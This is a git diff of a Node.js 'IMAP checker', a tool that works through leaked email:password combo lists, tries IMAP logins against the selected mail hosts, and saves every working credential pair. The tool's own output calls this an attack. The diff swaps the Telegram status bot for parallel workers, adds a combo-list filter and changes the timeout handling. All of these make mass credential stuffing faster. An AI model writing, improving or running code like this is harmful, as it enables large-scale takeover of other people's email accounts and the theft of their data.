@@ -1,10 +1,7 @@
-process.env["NTBA_FIX_319"] = 1; // telegram bot warning fix
 // dependencies
 
 import colors from "colors";
 import hashFile from "sha256-file";
-import imaps from "imap-simple";
-import telegramBot from "node-telegram-bot-api";
 import * as configs from "./imaps.json";
 import os from "os";
 import * as Logger from "./Logger";
@@ -12,86 +9,22 @@ import * as IO from "./IO";
 import * as Error from "./Error";
 import * as Prompt from "./Prompt";
 import * as Config from "./Config";
-import * as Constants from './Constants';
+import workerFarm from "worker-farm";
 
-var bot;
-var selection, dictionary, id;
-var max, counter, found, line, countTo, lastLine;
-var resumeSave, unreachbleHost, botEnabled, timeout;
-var log = "Nothing!";
+let workers = workerFarm(require.resolve("./Worker"));
+
+let selection, dictionary;
+let max, counter, found, countTo;
+let unreachbleHost;
 
 dictionary = null;
-max = counter = found = line = countTo = lastLine = 0;
-timeout = resumeSave = unreachbleHost = botEnabled = false;
-
-// Multiway Initialization
-const setupBot = () => {
-  botEnabled = true;
-  const botToken = Constants.TELEGRAM_API_KEY; // INSERT YOUR API KEY
-  if (botToken === "YOUR_API_KEY") {
-    console.log(
-      colors.white.bold(
-        "You tried to activate the bot without putting your Telegram API KEY"
-      )
-    );
-    console.log(
-      colors.white.bold("Generate one here : ") +
-        colors.underline.white.bold(
-          "https://core.telegram.org/bots#6-botfather"
-        )
-    );
-    process.exit();
-  }
-  bot = new telegramBot(botToken, { polling: true });
-
-  bot.addListener("polling_error", error => {
-    Error.telegramError();
-    botEnabled = false;
-    bot.stopPolling();
-    process.exit(404);
-  });
-
-  bot.onText(/\/status/, (msg, match) => {
-    // 'msg' is the received Message from Telegram
-    // 'match' is the result of executing the regexp above on the text content
-    // of the message
-    id = msg.chat.id;
-    // send back the matched "whatever" to the chat
-    bot.sendMessage(id, "Current progress is " + counter + " / " + max);
-    bot.sendMessage(id, "Found " + found + " working combo...");
-  });
-
-  bot.onText(/\/log/, (msg, match) => {
-    // 'msg' is the received Message from Telegram
-    // 'match' is the result of executing the regexp above on the text content
-    // of the message
-    id = msg.chat.id;
-    // send back the matched "whatever" to the chat
-    bot.sendMessage(id, log);
-  });
-
-  bot.onText(/\/start/, (msg, match) => {
-    // 'msg' is the received Message from Telegram
-    // 'match' is the result of executing the regexp above on the text content
-    // of the message
-    id = msg.chat.id;
-    // send back the matched "whatever" to the chat
-    bot.sendMessage(
-      id,
-      "Hello and welcome to the\nIMAP Checker Bot,\n" +
-        "Available commands are :\n" +
-        "\t/status: Show current progress\n" +
-        "\t/log: Show latest error\n"
-    );
-  });
-  selectFilePrompt();
-};
+max = counter = found = countTo = 0;
+unreachbleHost = false;
 
 const timedOut = () => {
-  console.log(os.EOL + "[*] Authentification TIMED OUT, retrying..." + "\r");
+  console.log(colors.red("[*] Authentification TIMED OUT...") + "\r");
   countTo++;
-  timeout = true;
-  if (countTo >= 5) {
+  if (countTo >= (max / 100) * 10) {
     console.log(colors.red("[*] Timed out too many times aborting attack!"));
     console.log(colors.red("[*] Current progress is " + counter + " / " + max));
     console.log(colors.red("[*] Found " + found + " working combo..."));
@@ -99,49 +32,54 @@ const timedOut = () => {
   }
 };
 
+const connectThen = config => {
+  found++;
+  Logger.clear();
+  console.log(
+    colors.green(
+      "[*] " +
+        config.imap.user +
+        ":" +
+        config.imap.password +
+        " | " +
+        found +
+        "/" +
+        (counter + 1)
+    )
+  );
+  IO.writeResult(config.imap.user + ":" + config.imap.password + os.EOL);
+  forward();
+};
+
+const connectCatch = (error, config) => {
+  Logger.clear();
+  console.log(
+    colors.red(
+      "[*] " +
+        config.imap.user +
+        ":" +
+        config.imap.password +
+        " | " +
+        found +
+        "/" +
+        (counter + 1)
+    )
+  );
+  if (error !== null) {
+    console.log(colors.red(error.toString()) + "\r");
+  }
+
+  if (error.source === "timeout") timedOut();
+  if (error.errno === -3008) unreachbleHost = true;
+
+  forward();
+};
 const connect = async config => {
   // MAKING A SAVE IN CASE OF A TIMEOUT
-  await imaps
-    .connect(config)
-    .then(connection => {
-      log = connection.toString();
-      found++;
-      process.stdout.write(
-        colors.green(
-          "\t[*] " + config.imap.user + ":" + config.imap.password + "\r\n"
-        )
-      );
-      IO.writeResult(config.imap.user + ":" + config.imap.password + os.EOL);
-      if (botEnabled)
-        bot.sendMessage(
-          id,
-          "[*] " + config.imap.user + ":" + config.imap.password
-        );
-      forward();
-    })
-    .catch(error => {
-      Logger.clear();
-      console.log(
-        colors.red(
-          "[*] " +
-            config.imap.user +
-            ":" +
-            config.imap.password +
-            " | " +
-            found +
-            "/" +
-            (counter + 1)
-        )
-      );
-      if (error !== null) {
-        log = error.toString();
-        console.log(colors.red(log) + "\r");
-      }
-      if (error.errno === -3008) unreachbleHost = true;
-      if (error.source === "timeout" || error.name === "ConnectionTimeoutError")
-        timedOut();
-      else forward();
-    });
+  workers(config, function(err, config) {
+    if (err) connectCatch(err, config);
+    else connectThen(config);
+  });
 };
 
 const forward = () => {
@@ -150,6 +88,19 @@ const forward = () => {
   countTo = 0;
 };
 
+const arrayCleaner = () => {
+  const array = IO.getComboList(dictionary);
+  let cleanArray = [];
+
+  for (const line in array)
+    for (let i = 0; i < selection.length; i++)
+      for (const id in configs[selection[i]].tag)
+        if (array[line].includes(configs[selection[i]].tag[id])) {
+          max++;
+          cleanArray.push(array[line]);
+        }
+  return cleanArray;
+};
 const main = async () => {
   // READING SAVE FILE
 
@@ -161,11 +112,8 @@ const main = async () => {
       JSON.stringify(element.host) === JSON.stringify(selection) &&
       element.hash === hashFile(dictionary)
     ) {
-      line = element.index;
       found = element.found;
-      max = element.max;
       counter = element.counter;
-      resumeSave = true;
       console.log(
         colors.green(
           "[*] Save has been found!\n[*] Starting back the attack from " +
@@ -175,33 +123,20 @@ const main = async () => {
     }
   });
 
-  var array = IO.getComboList(dictionary);
-
   // INITIALIZING LOOP
 
-  if (!resumeSave)
-    for (const line in array)
-      for (let i = 0; i < selection.length; i++)
-        for (const id in configs[selection[i]].tag)
-          if (array[line].includes(configs[selection[i]].tag[id])) max++;
-
+  const array = arrayCleaner();
   Logger.progressBar.start(max, counter);
-
   // MAIN LOOP
-  for (let line in array) {
-    if (timeout) {
-      line = lastLine;
-      timeout = false;
-    }
-    let config = Config.get(array[line], selection);
-    if (config) {
-      lastLine = line;
-      await connect(config);
-    }
+  for (counter in array) {
+    let config = Config.get(array[counter], selection);
+    if (config) await connect(config);
     if (unreachbleHost) break;
   }
 
-  onComplete();
+  workerFarm.end(workers, (error, output) => {
+    onComplete();
+  });
 };
 
 const selectFilePrompt = () => {
@@ -230,7 +165,7 @@ const onComplete = () => {
   console.log(
     colors.white.bold("- Total Mail Tested: " + max.toString() + " -")
   );
-  if (found > 0) IO.showResult();
+  if (found > 0) IO.showResult(found);
   else
     console.log(
       colors.white.bold(
@@ -241,24 +176,12 @@ const onComplete = () => {
   process.exit();
 };
 
-const telegramBotPrompt = () => {
-  Prompt.bot()
-    .then(answer => {
-      if (answer.activeBot) setupBot();
-      else selectFilePrompt();
-    })
-    .catch(err => {
-      console.error(err);
-      process.exit(1);
-    });
-};
-
 const selectHostPrompt = () => {
   Prompt.host()
     .then(array => {
       if (array.selection.length) {
         selection = array.selection;
-        telegramBotPrompt();
+        selectFilePrompt();
       } else Error.noHost();
     })
     .catch(err => {
@@ -275,9 +198,7 @@ const onCleanup = () => {
   const session = {
     timestamp: +new Date(),
     hash: hashFile(dictionary),
-    index: line,
     counter: counter,
-    max: max,
     found: found,
     host: selection
   };
